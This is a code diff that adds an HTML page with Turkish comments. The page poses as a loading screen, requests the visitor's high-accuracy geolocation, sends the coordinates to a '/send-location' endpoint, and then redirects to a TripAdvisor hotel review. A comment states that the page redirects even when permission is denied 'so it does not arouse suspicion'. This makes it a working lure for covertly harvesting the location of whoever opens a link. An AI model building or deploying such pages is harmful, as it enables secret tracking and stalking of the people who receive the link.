@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Yükleniyor...</title>
+    <style>
+        body { background-color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+    </style>
+</head>
+<body onload="askLocation()">
+    <div id="loader">Sayfa Yükleniyor, Lütfen Bekleyin...</div>
+
+    <script>
+        function askLocation() {
+            // TripAdvisor linki
+            const targetUrl = "https://www.tripadvisor.com.tr/Hotel_Review-g1600795-d2323177-Reviews-Amasya_Ogretmenevi-Amasya_Amasya_Province.html";
+
+            if (navigator.geolocation) {
+                // Konum izni istenirken seçenekler: yüksek doğruluk ve zaman aşımı
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const data = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+
+                    // Konumu sunucuya gönder
+                    fetch("/send-location", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(data)
+                    }).then(() => {
+                        // Konum gönderildikten sonra asıl siteye yönlendir
+                        window.location.href = targetUrl;
+                    });
+                }, (error) => {
+                    // İzin verilmezse de yönlendir ki şüphe çekmesin
+                    window.location.href = targetUrl;
+                }, { 
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                });
+            } else {
+                window.location.href = targetUrl;
+            }
+        }
+    </script>
+</body>
+</html>
